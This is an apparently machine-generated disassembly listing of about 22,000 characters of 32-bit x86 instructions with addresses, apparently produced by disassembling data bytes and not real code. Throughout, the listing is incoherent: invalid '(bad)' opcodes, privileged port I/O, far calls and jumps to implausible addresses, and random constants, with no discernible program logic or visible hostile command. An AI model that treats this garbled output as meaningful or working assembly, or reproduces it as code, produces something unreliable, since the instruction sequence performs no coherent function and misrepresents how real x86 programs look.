  415776:	jp     0x415732
  415778:	aam    0x9d
  41577a:	test   DWORD PTR [edi-0x363fa71],ecx
  415780:	lds    edx,FWORD PTR [ecx+0x1d3829a2]
  415786:	and    DWORD PTR [ebp+0x4d7ba907],0x68
  41578d:	cmp    eax,0xf256374f
  415792:	dec    eax
  415793:	sbb    DWORD PTR [ecx-0x4903773c],esi
  415799:	test   edx,0x9589eff6
  41579f:	cmp    DWORD PTR ds:0x995b5dfb,ebp
  4157a5:	push   esp
  4157a6:	and    edi,DWORD PTR [ecx-0x115b75ee]
  4157ac:	fldcw  WORD PTR [esi-0x58]
  4157af:	and    bl,ah
  4157b1:	jle    0x41581a
  4157b3:	mov    esi,0xe6c2f7c8
  4157b8:	sbb    al,0x8f
  4157ba:	pop    ebx
  4157bb:	test   edx,edi
  4157bd:	mov    bh,0xc5
  4157bf:	and    eax,0xa419c8dc
  4157c4:	jae    0x415774
  4157c6:	repz les esp,FWORD PTR [eax]
  4157c9:	add    al,0x3d
  4157cb:	push   edi
  4157cc:	and    ah,al
  4157ce:	cmc    
  4157cf:	int    0x76
  4157d1:	mov    ah,0x45
  4157d3:	mov    DWORD PTR [eax-0x2],ecx
  4157d6:	data16 fdiv DWORD PTR [ecx]
  4157d9:	loop   0x41578c
  4157db:	jp     0x4157dd
  4157dd:	in     eax,dx
  4157de:	mov    ah,0xa3
  4157e0:	push   es
  4157e1:	xchg   edi,eax
  4157e2:	enter  0x360,0x59
  4157e6:	(bad)  
  4157e7:	mov    bl,0x57
  4157e9:	ficom  DWORD PTR [ebx-0x49]
  4157ec:	pusha  
  4157ed:	mov    al,0xc8
  4157ef:	daa    
  4157f0:	push   edx
  4157f1:	and    BYTE PTR [edi-0x57],dl
  4157f4:	clc    
  4157f5:	les    eax,FWORD PTR [edi+0x73]
  4157f8:	xor    eax,0x62e61b4c
  4157fd:	xchg   ch,dl
  4157ff:	retf   
  415800:	adc    DWORD PTR ds:0x62a6f1f0,0xf7865d25
  41580a:	push   ebp
  41580b:	lahf   
  41580c:	nop
  41580d:	ret    
  41580e:	push   es
  41580f:	sub    bl,al
  415811:	adc    eax,0x711640f3
  415816:	pop    es
  415817:	pushf  
  415818:	and    DWORD PTR [esi],ecx
  41581a:	repz or DWORD PTR [eax],edx
  41581d:	addr16 fs dec ebp
  415820:	push   edx
  415822:	aas    
  415823:	xor    al,0x6
  415825:	pop    ss
  415826:	ret    0x1d0f
  415829:	xchg   edi,eax
  41582a:	dec    ebx
  41582b:	test   dh,al
  41582d:	imul   edi,DWORD PTR [ebp+0x7ff5839c],0x89206d9a
  415837:	ror    ah,cl
  415839:	push   edx
  41583a:	rol    ah,cl
  41583c:	push   es
  41583d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41583e:	in     eax,dx
  41583f:	fdiv   QWORD PTR [eax]
  415841:	xor    eax,0xb7092c60
  415846:	stos   BYTE PTR es:[edi],al
  415847:	jb     0x415800
  415849:	pop    esp
  41584a:	out    dx,al
  41584b:	retf   
  41584c:	mov    dh,0x8a
  41584e:	jns    0x41587e
  415850:	mul    BYTE PTR [esi+0x4be596b7]
  415856:	jns    0x41589d
  415858:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415859:	shl    ch,cl
  41585b:	mov    DWORD PTR [ebx-0x1c],ebx
  41585e:	sbb    bl,BYTE PTR [edi-0x6d]
  415861:	aad    0x6a
  415863:	pop    es
  415864:	adc    eax,DWORD PTR [edx]
  415866:	and    al,0xd4
  415868:	inc    edx
  415869:	adc    eax,0xb31704ba
  41586e:	fdiv   QWORD PTR [eax-0x68]
  415871:	inc    esi
  415872:	push   edi
  415873:	jno    0x4158cc
  415875:	retf   0x6251
  415878:	push   ebx
  415879:	xchg   BYTE PTR [edi+0x7f],cl
  41587c:	les    esp,FWORD PTR [ebx+0x25]
  41587f:	xchg   esp,eax
  415880:	lock sbb eax,0xf87a833b
  415886:	aam    0x46
  415888:	sbb    al,ah
  41588a:	push   ecx
  41588b:	xchg   edx,eax
  41588c:	cmp    al,0x40
  41588e:	in     eax,0xdc
  415890:	(bad)  
  415891:	xchg   ebx,eax
  415892:	shl    BYTE PTR [edx-0x46],cl
  415895:	repz mov esi,0xa3b4fb07
  41589b:	inc    edx
  41589c:	out    0xce,al
  41589e:	adc    DWORD PTR [ebx-0x3698cef1],edi
  4158a4:	out    0x24,al
  4158a6:	sub    edi,DWORD PTR [edi+eax*8]
  4158a9:	push   0xfffffff1
  4158ab:	cmp    al,0xe5
  4158ad:	mov    fs:0x6c05394d,al
  4158b3:	in     eax,0xa7
  4158b5:	xchg   edi,eax
  4158b6:	xlat   BYTE PTR ds:[ebx]
  4158b7:	jae    0x415840
  4158b9:	ss jmp 0x804d1f64
  4158bf:	sub    al,0x28
  4158c1:	(bad)  
  4158c2:	test   al,0xf5
  4158c4:	shl    DWORD PTR [esi-0x4d],1
  4158c7:	imul   ecx,DWORD PTR [edx-0x6d],0xffffffda
  4158cb:	mov    al,0x43
  4158cd:	lock arpl WORD PTR [edi-0x2f],ax
  4158d1:	xchg   esi,eax
  4158d2:	shl    DWORD PTR [eax],1
  4158d4:	push   ss
  4158d5:	push   esp
  4158d6:	mov    ebx,0x3a7fbcb4
  4158db:	repnz mov WORD PTR [ecx+0x42d21e5c],cs
  4158e2:	pop    ecx
  4158e3:	push   esi
  4158e4:	fcom   DWORD PTR [edx+0x5b088e48]
  4158ea:	push   edi
  4158eb:	adc    DWORD PTR [ebx-0x5b9305ef],0x6af4b3a8
  4158f5:	stos   BYTE PTR es:[edi],al
  4158f6:	pushf  
  4158f7:	pushf  
  4158f8:	inc    ecx
  4158f9:	enter  0x7fc5,0x38
  4158fd:	and    bl,0xe8
  415900:	sbb    ah,BYTE PTR [ebx-0x1326f8e5]
  415906:	inc    ebp
  415907:	js     0x4158ae
  415909:	add    BYTE PTR [eax+0x5e],bl
  41590c:	pop    ebp
  41590d:	inc    eax
  41590e:	iret   
  41590f:	sub    BYTE PTR [esi],ah
  415911:	call   0x5fd7:0xee7b2b84
  415918:	mov    ah,0x5
  41591a:	retf   0x538b
  41591d:	mov    ebx,edi
  41591f:	sub    DWORD PTR [ecx-0x2eca97a0],esi
  415925:	add    DWORD PTR [ecx+0x5deaf453],ebp
  41592b:	adc    eax,0x76
  41592e:	aad    0x19
  415930:	out    0xc4,al
  415932:	xor    dl,BYTE PTR [eax]
  415934:	mov    dl,0x4
  415936:	jecxz  0x41594b
  415938:	jl     0x415932
  41593a:	or     DWORD PTR [esi],edx
  41593c:	cli    
  41593d:	push   0x12
  41593f:	mov    esp,0x863e120
  415944:	out    0x40,eax
  415946:	dec    esp
  415947:	ret    
  415948:	inc    ebx
  415949:	das    
  41594a:	rol    DWORD PTR [ecx-0x13d83f50],0x6e
  415951:	sub    BYTE PTR [edi+0x20],ah
  415954:	stos   BYTE PTR es:[edi],al
  415955:	(bad)  
  415957:	out    0x3f,eax
  415959:	and    DWORD PTR [esi+0x6f],esi
  41595c:	add    eax,0x8b908cf0
  415961:	inc    esi
  415962:	push   0xffffffa5
  415964:	sahf   
  415965:	mov    ah,0x63
  415967:	mov    bl,bl
  415969:	or     DWORD PTR ds:0xf1a1922c,esp
  41596f:	pop    edi
  415970:	or     DWORD PTR [ebx+edi*4-0x2f87acea],ebx
  415977:	enter  0xa7c9,0x1a
  41597b:	sbb    al,0x81
  41597d:	call   0x9e1c:0x1f63d2e2
  415984:	ficom  WORD PTR [ecx+eiz*2]
  415987:	sub    eax,0xb94fa576
  41598c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41598d:	cmc    
  41598e:	je     0x415959
  415990:	(bad)  
  415991:	(bad)  
  415992:	ficomp DWORD PTR [esi-0x45169ee0]
  415998:	hlt    
  415999:	fsub   DWORD PTR [esi+esi*4+0x68]
  41599d:	push   edx
  41599e:	mov    eax,ds:0xddaa801d
  4159a3:	fs mov bh,0xa4
  4159a6:	shl    BYTE PTR [edx+0x56],0xf8
  4159aa:	cli    
  4159ab:	test   eax,0x67889b60
  4159b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4159b1:	mov    eax,ds:0xa958b8d3
  4159b6:	repnz push ebx
  4159b8:	je     0x41593e
  4159ba:	pop    ebx
  4159bb:	imul   esi,DWORD PTR ds:0x58a0d2fd,0x2a9b560a
  4159c5:	dec    esi
  4159c6:	ror    BYTE PTR [ebp-0xc],0xb5
  4159ca:	dec    edx
  4159cb:	sti    
  4159cc:	sub    DWORD PTR [eax],ecx
  4159ce:	sbb    bh,BYTE PTR [ecx]
  4159d0:	fwait
  4159d1:	push   ecx
  4159d2:	push   esp
  4159d3:	push   ebp
  4159d4:	xchg   ebx,eax
  4159d5:	fnstenv [edx+ecx*1+0x43327991]
  4159dc:	or     ah,cl
  4159de:	por    mm7,QWORD PTR [ebp-0x10]
  4159e2:	mov    edx,0x82dbdedd
  4159e7:	adc    DWORD PTR ds:0x34f22aaf,esp
  4159ed:	pop    eax
  4159ee:	push   0x90b5f56f
  4159f3:	cdq    
  4159f4:	mov    bh,0xd1
  4159f6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4159f7:	repz out dx,al
  4159f9:	sbb    dl,cl
  4159fb:	std    
  4159fc:	das    
  4159fd:	mov    dh,0x21
  4159ff:	sbb    BYTE PTR [ebp-0x282bb9f7],ch
  415a05:	inc    edx
  415a06:	adc    eax,0x385f3dec
  415a0b:	ins    DWORD PTR es:[edi],dx
  415a0c:	mov    ds:0x404aa00c,eax
  415a11:	enter  0x3e33,0x7e
  415a15:	inc    ecx
  415a16:	call   0xd3f:0x8774dfcd
  415a1d:	fcomp  QWORD PTR [eax-0x76]
  415a20:	es stos DWORD PTR es:[edi],eax
  415a22:	dec    edi
  415a23:	or     edi,esi
  415a25:	sub    DWORD PTR [esi+0x1b],ebx
  415a28:	or     DWORD PTR [ebp+0xb3e0246],edi
  415a2e:	fs mov eax,0x66f29458
  415a34:	out    0xbf,al
  415a36:	and    BYTE PTR [eax+0x56b5969f],ch
  415a3c:	sub    edi,DWORD PTR [eax]
  415a3e:	scas   eax,DWORD PTR es:[edi]
  415a3f:	add    DWORD PTR [edi+0x24],ecx
  415a42:	xor    edx,ebx
  415a44:	fldenv [edi+0x70f17eb]
  415a4a:	sub    ah,BYTE PTR [edi]
  415a4c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415a4d:	shr    BYTE PTR [ebp+0x74a1ac70],0x9
  415a54:	jl     0x415ac6
  415a56:	cwde   
  415a57:	mov    edi,DWORD PTR [ebx+0x70]
  415a5a:	sbb    BYTE PTR [edi+esi*4+0x61a83bfa],ah
  415a61:	outs   dx,DWORD PTR ds:[esi]
  415a62:	sbb    esi,DWORD PTR [edx]
  415a64:	xlat   BYTE PTR ds:[ebx]
  415a65:	leave  
  415a66:	xor    bl,bl
  415a68:	inc    ecx
  415a69:	jge    0x415a92
  415a6b:	(bad)  
  415a6c:	xlat   BYTE PTR ds:[ebx]
  415a6d:	(bad)  
  415a6e:	pop    ebx
  415a6f:	test   DWORD PTR [esi],ebp
  415a71:	xor    BYTE PTR [eax+0x4e818e3f],0x11
  415a78:	add    DWORD PTR ds:[esi+0x53],edi
  415a7c:	mov    bh,0x8d
  415a7e:	(bad)  
  415a7f:	jb     0x415a24
  415a81:	scas   al,BYTE PTR es:[edi]
  415a82:	test   BYTE PTR [ecx+0x3a37105e],cl
  415a88:	push   cs
  415a89:	test   DWORD PTR [esi-0x6b],edx
  415a8c:	fsubr  DWORD PTR [ebx]
  415a8e:	xchg   edi,eax
  415a8f:	ins    DWORD PTR es:[edi],dx
  415a90:	push   ecx
  415a91:	frstor [ebp-0x54]
  415a94:	arpl   WORD PTR [esi+0x41],sp
  415a97:	jmp    0x415a72
  415a99:	mov    ebp,DWORD PTR [ebx-0x76]
  415a9c:	test   al,0xc0
  415a9e:	xor    al,0x71
  415aa0:	(bad)  [ecx+0x23]
  415aa3:	cwde   
  415aa4:	xor    al,0x83
  415aa6:	mov    ch,0x86
  415aa8:	stos   DWORD PTR es:[edi],eax
  415aa9:	aaa    
  415aaa:	add    dh,ah
  415aac:	icebp  
  415aad:	ins    DWORD PTR es:[edi],dx
  415aae:	xor    eax,0xf268ab3
  415ab3:	loop   0x415a85
  415ab5:	mov    gs,WORD PTR [eax+0x7908282b]
  415abb:	lahf   
  415abc:	pop    ecx
  415abd:	cld    
  415abe:	mov    gs,WORD PTR [eax]
  415ac0:	push   edx
  415ac1:	imul   eax,DWORD PTR [ebx],0x9c93b0db
  415ac7:	or     DWORD PTR [edx-0x6823b638],edi
  415acd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415ace:	std    
  415acf:	ret    
  415ad0:	mov    eax,ds:0xb0501fd8
  415ad5:	inc    esp
  415ad6:	mov    gs,WORD PTR [esi]
  415ad8:	int    0x73
  415ada:	int    0x9d
  415adc:	hlt    
  415add:	nop
  415ade:	js     0x415b23
  415ae0:	pop    ecx
  415ae1:	mov    al,0x4c
  415ae3:	mov    cl,0xe
  415ae5:	mov    edi,0x8c68a0ae
  415aea:	stos   BYTE PTR es:[edi],al
  415aeb:	push   edx
  415aec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415aed:	pop    ecx
  415aee:	xor    dl,BYTE PTR [ebx]
  415af0:	xor    al,0x83
  415af2:	ins    BYTE PTR es:[edi],dx
  415af3:	mov    dh,0x6a
  415af5:	sbb    DWORD PTR [ebx+0x1c1a74ff],0xffffffe1
  415afc:	sbb    BYTE PTR [esi],ah
  415afe:	push   eax
  415aff:	(bad)  
  415b00:	in     eax,dx
  415b01:	or     al,0x9
  415b03:	lss    ebp,FWORD PTR [ecx]
  415b06:	inc    esi
  415b07:	or     bl,0xc9
  415b0a:	loope  0x415b8a
  415b0c:	lock mov ebp,0x8a322dbb
  415b12:	sbb    esi,DWORD PTR [ebx-0x2e74b211]
  415b18:	mov    dl,0xbf
  415b1a:	xchg   edi,eax
  415b1b:	and    al,0x52
  415b1d:	out    dx,eax
  415b1e:	(bad)  
  415b1f:	daa    
  415b20:	push   es
  415b21:	inc    esi
  415b22:	push   0xffffffab
  415b24:	lea    ebp,[edx+0x69]
  415b27:	push   ebp
  415b28:	dec    ebp
  415b29:	into   
  415b2a:	add    al,BYTE PTR [esi-0x2f084e85]
  415b30:	mov    db6,ecx
  415b33:	mov    dh,BYTE PTR [edi+0x58]
  415b36:	loope  0x415ac5
  415b38:	cmp    DWORD PTR [edi-0x3c2b52d6],ecx
  415b3e:	fild   QWORD PTR [ebp+ebx*4-0x5d]
  415b42:	stos   DWORD PTR es:[edi],eax
  415b43:	les    esi,FWORD PTR [ebx-0x124491ad]
  415b49:	jb     0x415ba6
  415b4b:	out    dx,al
  415b4c:	mov    ebx,0xb2914a8e
  415b51:	cmp    BYTE PTR [edx-0x6517da4f],ah
  415b57:	dec    edx
  415b58:	xchg   ebp,eax
  415b59:	ja     0x415b59
  415b5b:	mov    ds:0xe69889f5,al
  415b60:	xchg   edi,eax
  415b61:	sqrtps xmm2,XMMWORD PTR [ebx-0x72bbf27a]
  415b68:	mov    cl,0x73
  415b6a:	(bad)  
  415b6b:	in     eax,dx
  415b6c:	add    eax,0x8d8a7129
  415b71:	in     al,dx
  415b72:	in     eax,0xdb
  415b74:	push   ecx
  415b75:	inc    ebx
  415b76:	jae    0x415bc2
  415b78:	adc    DWORD PTR [eax+0x21ab560],esi
  415b7e:	adc    eax,DWORD PTR [edi-0x4b]
  415b81:	(bad)  
  415b82:	rcl    bh,1
  415b84:	xchg   DWORD PTR [edx],edi
  415b86:	lds    edx,FWORD PTR [ebx]
  415b88:	dec    eax
  415b89:	jge    0x415bb6
  415b8b:	lds    ebx,FWORD PTR [ebx+edx*4-0x3c]
  415b8f:	jmp    0x67a:0x6242e478
  415b96:	inc    esi
  415b97:	retf   0xee8b
  415b9a:	mov    bl,0xf6
  415b9c:	push   ebx
  415b9d:	push   edi
  415b9e:	lahf   
  415b9f:	pop    edx
  415ba0:	mov    edx,0xbbb70486
  415ba5:	xor    edi,DWORD PTR [edx-0x3dc8a07b]
  415bab:	arpl   si,sp
  415bad:	add    eax,0x7d99121d
  415bb2:	imul   ecx,DWORD PTR [ebx+0x4b],0x4422f136
  415bb9:	xchg   esp,eax
  415bba:	jg     0x415c26
  415bbc:	dec    ebx
  415bbd:	adc    eax,0x2400a728
  415bc2:	std    
  415bc3:	repz dec ebx
  415bc5:	push   edi
  415bc6:	xor    BYTE PTR [edx-0x6c8b6af1],0x8d
  415bcd:	jge    0x415beb
  415bcf:	fiadd  DWORD PTR [ebx]
  415bd1:	or     eax,0xb44aab70
  415bd6:	fisub  DWORD PTR [edi]
  415bd8:	xchg   BYTE PTR [ebp-0x33],cl
  415bdb:	loop   0x415bdd
  415bdd:	cmc    
  415bde:	imul   ebx,DWORD PTR [ecx+eax*2+0x76f1bcf3],0xffffffe2
  415be6:	lahf   
  415be7:	adc    ah,BYTE PTR [ebx]
  415be9:	mov    ?,WORD PTR [esi]
  415beb:	ins    BYTE PTR es:[edi],dx
  415bec:	scas   al,BYTE PTR es:[edi]
  415bed:	mov    ebx,0x7ef8c8c8
  415bf2:	scas   eax,DWORD PTR es:[edi]
  415bf3:	rcr    BYTE PTR [ecx],1
  415bf5:	loopne 0x415b77
  415bf7:	es jp  0x415b9c
  415bfa:	sti    
  415bfb:	push   0x53
  415bfd:	xchg   BYTE PTR [eax-0x61ce6761],cl
  415c03:	rcr    DWORD PTR [ebp-0x7c48fa77],cl
  415c09:	mov    ch,0x42
  415c0b:	arpl   WORD PTR [ebx+0x2f],di
  415c0e:	fdecstp 
  415c10:	mov    edi,gs
  415c12:	xchg   BYTE PTR [edx+0x4f31feb2],bl
  415c18:	rol    BYTE PTR [eax-0x20a9c3c5],0x7c
  415c1f:	mov    ebx,0x362f3aa5
  415c24:	xor    ch,bh
  415c26:	sbb    al,0x42
  415c28:	scas   eax,DWORD PTR es:[edi]
  415c29:	(bad)  [edx+0x2aac2e18]
  415c2f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415c30:	and    ah,ah
  415c32:	xchg   edx,eax
  415c33:	mov    ds:0xf52729a9,al
  415c38:	fs je  0x415bd6
  415c3b:	call   0x72f7:0x4d7cac8a
  415c42:	xor    bh,bh
  415c44:	test   ebp,edx
  415c46:	jmp    0xeb2a:0x2a2ffa82
  415c4d:	xchg   ebp,eax
  415c4e:	jl     0x415bf3
  415c50:	sub    ah,BYTE PTR [edx+0x498a51a1]
  415c56:	xchg   esi,eax
  415c57:	shl    BYTE PTR [ebx-0xd],1
  415c5a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415c5b:	xchg   ecx,eax
  415c5c:	fidiv  DWORD PTR [edi+0x41]
  415c5f:	test   eax,0x61aa7372
  415c64:	jae    0x415c55
  415c66:	cs loop 0x415cb2
  415c69:	push   edx
  415c6a:	add    BYTE PTR [esi+0xe],bh
  415c6d:	mov    ch,0x1f
  415c6f:	add    al,BYTE PTR [ebx+0x14]
  415c72:	ss cs clc 
  415c75:	sub    BYTE PTR [esi+0x5a83c98c],ah
  415c7b:	int    0xf0
  415c7d:	sub    eax,DWORD PTR [edi-0x6b]
  415c80:	int3   
  415c81:	push   cs
  415c82:	mov    ch,0x86
  415c84:	ss push cs
  415c86:	js     0x415c6a
  415c88:	call   0xb56d:0x8bcd767f
  415c8f:	mov    DWORD PTR [edi-0x38d5acd0],0xafb29508
  415c99:	sti    
  415c9a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415c9b:	int3   
  415c9c:	pop    eax
  415c9d:	loop   0x415ccc
  415c9f:	enter  0x9f69,0x37
  415ca3:	sub    cl,BYTE PTR [edi-0x73b58618]
  415ca9:	add    BYTE PTR [ecx+edx*2-0x16a7d3cd],bl
  415cb0:	mov    DWORD PTR [edx+esi*4+0x61ca90c9],ebx
  415cb7:	dec    esi
  415cb8:	or     al,0xfe
  415cba:	mov    dl,0xb8
  415cbc:	mov    al,ds:0x92d1e38c
  415cc1:	outs   dx,BYTE PTR ds:[esi]
  415cc2:	jg     0x415d24
  415cc4:	imul   eax,DWORD PTR [ebp+0x2ce95cb8],0xffffff8e
  415ccb:	jecxz  0x415cc3
  415ccd:	rcr    DWORD PTR [ebp-0x289cce4e],0x85
  415cd4:	rcl    DWORD PTR [eax-0x24],0x18
  415cd8:	sbb    DWORD PTR [ebp+0xca8ea04],esi
  415cde:	in     eax,0xa7
  415ce0:	mov    esp,0xda8d0887
  415ce5:	sbb    esp,edx
  415ce7:	repnz and al,0x5e
  415cea:	mov    eax,0xcee01e08
  415cef:	(bad)  
  415cf0:	adc    eax,0x98f47ad3
  415cf5:	inc    ecx
  415cf6:	add    dh,BYTE PTR [edi-0x4c]
  415cf9:	int3   
  415cfa:	dec    eax
  415cfb:	xchg   bl,dl
  415cfd:	jl     0x415d02
  415cff:	aas    
  415d00:	clc    
  415d01:	adc    bh,bl
  415d03:	imul   eax,DWORD PTR [esi],0xffffff97
  415d06:	or     DWORD PTR [ebx-0x5d],ebp
  415d09:	and    dh,BYTE PTR [ebx+0x5e6b90b8]
  415d0f:	xchg   edx,eax
  415d10:	fimul  DWORD PTR [ecx+0x66]
  415d13:	aaa    
  415d14:	and    edi,ebp
  415d16:	mov    cl,0x15
  415d18:	inc    eax
  415d19:	stc    
  415d1a:	push   esp
  415d1b:	lea    esi,[esi]
  415d1d:	mov    DWORD PTR ds:0x25b2d03b,edx
  415d23:	mov    ah,0x3d
  415d25:	lahf   
  415d26:	fwait
  415d27:	test   BYTE PTR [ecx],dh
  415d29:	push   ecx
  415d2a:	test   eax,0xcfcbad29
  415d2f:	repz fmul QWORD PTR [ebx]
  415d32:	pushf  
  415d33:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415d34:	mov    ds:0x76800152,eax
  415d39:	sub    dh,BYTE PTR [edi]
  415d3b:	pop    esi
  415d3c:	pop    edi
  415d3d:	pop    edi
  415d3e:	cmp    BYTE PTR [esi],0xa
  415d41:	loop   0x415cca
  415d43:	pop    edx
  415d44:	rcl    BYTE PTR [edx+0x2b63bfc3],cl
  415d4a:	out    dx,al
  415d4b:	lods   eax,DWORD PTR ds:[esi]
  415d4c:	pop    esi
  415d4d:	fdivr  DWORD PTR [edx]
  415d4f:	sub    BYTE PTR [eax],bl
  415d51:	in     al,0x4e
  415d53:	add    dl,BYTE PTR [esi+0x1343fd19]
  415d59:	out    dx,eax
  415d5a:	mov    esp,0x17c2eba0
  415d5f:	adc    esp,edi
  415d61:	shl    DWORD PTR [eax],1
  415d63:	add    BYTE PTR [eax],0xd
  415d66:	mov    ds:0x1d00c9d8,al
  415d6b:	std    
  415d6c:	int    0xca
  415d6e:	mov    al,ds:0xab195466
  415d73:	push   esi
  415d74:	stos   BYTE PTR es:[edi],al
  415d75:	(bad)  
  415d76:	aam    0x6c
  415d78:	arpl   WORD PTR [edx+0x1d],bp
  415d7b:	or     DWORD PTR ds:0x596826cd,esi
  415d81:	std    
  415d82:	ret    0xaaa8
  415d85:	cs push ecx
  415d87:	add    edi,DWORD PTR [ecx+0x36c1e3dc]
  415d8d:	repnz xor ebx,0xd47aeb9
  415d94:	push   cs
  415d95:	daa    
  415d96:	pusha  
  415d97:	push   ds
  415d98:	sbb    dh,BYTE PTR [edi+0x66]
  415d9b:	int3   
  415d9c:	cmp    DWORD PTR [edx+0x7a],edi
  415d9f:	pop    edi
  415da0:	les    esi,FWORD PTR [ebx]
  415da2:	scas   eax,DWORD PTR es:[edi]
  415da3:	aaa    
  415da4:	xchg   ebp,eax
  415da5:	imul   edi,DWORD PTR [edx-0x244436b7],0xc85e27e
  415daf:	push   DWORD PTR [edi+ebp*1]
  415db2:	push   ss
  415db3:	push   edi
  415db4:	int    0x6c
  415db6:	fsub   DWORD PTR [edi+0x6335aaa6]
  415dbc:	cli    
  415dbd:	stc    
  415dbe:	bound  edi,QWORD PTR [esi+0x5e]
  415dc1:	mov    esp,0x81364c86
  415dc6:	mov    al,fs:0x6c962380
  415dcc:	es test eax,0xaecf59e9
  415dd2:	cmp    esi,eax
  415dd4:	jmp    0x415db1
  415dd6:	fndisi(8087 only) 
  415dd8:	push   ebx
  415dd9:	add    eax,0x564cfdde
  415dde:	cs pop ecx
  415de0:	mov    edi,0xcf72890b
  415de5:	jl     0x415e28
  415de7:	xchg   edi,esi
  415de9:	pop    edi
  415dea:	sbb    DWORD PTR [edx-0x704b7e66],eax
  415df0:	xchg   edx,eax
  415df1:	jnp    0x415e0a
  415df3:	stos   DWORD PTR es:[edi],eax
  415df4:	cdq    
  415df5:	cmp    DWORD PTR [ebp-0x59],esp
  415df8:	and    eax,0x3f0adfa3
  415dfd:	fwait
  415dfe:	xchg   edx,eax
  415dff:	mov    ebp,0x9cd7e03e
  415e04:	push   es
  415e05:	aad    0x7f
  415e07:	dec    ecx
  415e08:	xchg   BYTE PTR [edi+esi*8+0x67e48cf8],bh
  415e0f:	and    ebx,ebx
  415e11:	push   ecx
  415e12:	pop    esi
  415e13:	cmp    al,0xfd
  415e15:	add    eax,DWORD PTR [eax]
  415e17:	mov    ebx,0x47b458e3
  415e1c:	gs xchg edx,eax
  415e1e:	int3   
  415e1f:	out    dx,eax
  415e20:	lods   eax,DWORD PTR ds:[esi]
  415e21:	pop    esp
  415e22:	mov    al,0x78
  415e24:	test   al,0xfa
  415e26:	jno    0x415de7
  415e28:	mov    al,0x15
  415e2a:	pushf  
  415e2b:	bound  esp,QWORD PTR [edx]
  415e2d:	pop    esi
  415e2e:	cld    
  415e2f:	and    al,0x5e
  415e31:	test   al,0xb5
  415e33:	jecxz  0x415dc4
  415e35:	or     al,0xa7
  415e37:	pop    ebp
  415e38:	lock jb 0x415ea9
  415e3b:	push   ecx
  415e3c:	sub    al,0xf5
  415e3e:	hlt    
  415e3f:	lds    esi,FWORD PTR fs:[eax+0x62]
  415e43:	dec    ebp
  415e44:	dec    esi
  415e45:	stos   DWORD PTR es:[edi],eax
  415e46:	xchg   edi,eax
  415e47:	iret   
  415e48:	or     eax,0xcc0c6dce
  415e4d:	shr    BYTE PTR [esi+0x2],0xf8
  415e51:	inc    edx
  415e52:	fidivr WORD PTR [edx-0x20]
  415e55:	lahf   
  415e56:	pop    edx
  415e57:	sbb    esp,DWORD PTR [edx]
  415e59:	fsubr  QWORD PTR [esi+eax*8-0x20b8a12e]
  415e60:	push   ss
  415e61:	cmp    esi,DWORD PTR [ecx-0x5b4376fd]
  415e67:	test   eax,0x53f0ef61
  415e6c:	(bad)  
  415e6d:	adc    DWORD PTR es:[ebx],0x37
  415e71:	add    al,0x4c
  415e73:	cs jle 0x415e42
  415e76:	sub    BYTE PTR [edi+0x2137dd07],al
  415e7c:	push   es
  415e7d:	mov    ah,0xb0
  415e7f:	test   eax,0x117541bc
  415e84:	idiv   DWORD PTR [edi+edi*8+0x3535e1a2]
  415e8b:	test   edx,ebp
  415e8d:	retf   
  415e8e:	push   esi
  415e8f:	push   0x3854cf4b
  415e94:	lock adc eax,0x2581705c
  415e9a:	jae    0x415e30
  415e9c:	inc    ebp
  415e9d:	inc    ebx
  415e9e:	call   0x8c34a5ac
  415ea3:	dec    ebp
  415ea4:	mov    ah,0x2e
  415ea6:	in     al,dx
  415ea7:	rol    BYTE PTR ss:[ebp+0x5b4111b0],1
  415eae:	adc    al,0xa6
  415eb0:	sti    
  415eb1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415eb2:	gs jmp 0xca71441f
  415eb8:	in     eax,0x3f
  415eba:	aam    0x2b
  415ebc:	adc    DWORD PTR [edi-0x4288f60b],esp
  415ec2:	repnz pop ebp
  415ec4:	imul   edx,DWORD PTR [esi-0x43],0xffffffbf
  415ec8:	aaa    
  415ec9:	popf   
  415eca:	setl   BYTE PTR [edx+0x3f8af9d1]
  415ed1:	test   DWORD PTR [ebp-0x7be9cc9d],esp
  415ed7:	xchg   ebp,eax
  415ed8:	into   
  415ed9:	shl    DWORD PTR [edx],0xaf
  415edc:	mov    ecx,0x5be8a693
  415ee1:	pop    es
  415ee2:	sub    BYTE PTR [edx],ah
  415ee4:	test   al,0x1b
  415ee6:	cmp    BYTE PTR [ebx+ebp*8],bh
  415ee9:	inc    esi
  415eea:	pop    ecx
  415eeb:	pop    es
  415eec:	and    edx,DWORD PTR [esi+0xb]
  415eef:	inc    edx
  415ef0:	ret    0x5982
  415ef3:	jb     0x415eea
  415ef5:	and    DWORD PTR [esi],ecx
  415ef7:	popf   
  415ef8:	mov    WORD PTR [ecx-0x40],fs
  415efb:	ret    
  415efc:	fnsave [esi]
  415efe:	cmp    BYTE PTR [ecx+0x9626074],al
  415f04:	inc    esi
  415f05:	arpl   WORD PTR [bx],bx
  415f08:	call   0x14c41816
  415f0d:	mov    fs,WORD PTR ds:0x30948a0c
  415f13:	cmc    
  415f14:	add    bh,cl
  415f16:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415f17:	sbb    ecx,DWORD PTR cs:[ebx]
  415f1a:	inc    ecx
  415f1b:	stc    
  415f1c:	and    eax,0xdfcb2439
  415f21:	push   ecx
  415f22:	sbb    eax,0x1f7d3b06
  415f27:	fs pusha 
  415f29:	xchg   ebp,eax
  415f2a:	and    BYTE PTR [edi],0xdd
  415f2d:	xor    ah,ch
  415f2f:	sub    eax,ebp
  415f31:	pusha  
  415f32:	fstp   QWORD PTR [eax-0x49ab9f37]
  415f38:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415f3a:	enter  0xaa64,0x51
  415f3e:	push   eax
  415f3f:	mov    ?,WORD PTR [edx+esi*2]
  415f42:	addr16 cmp al,0x40
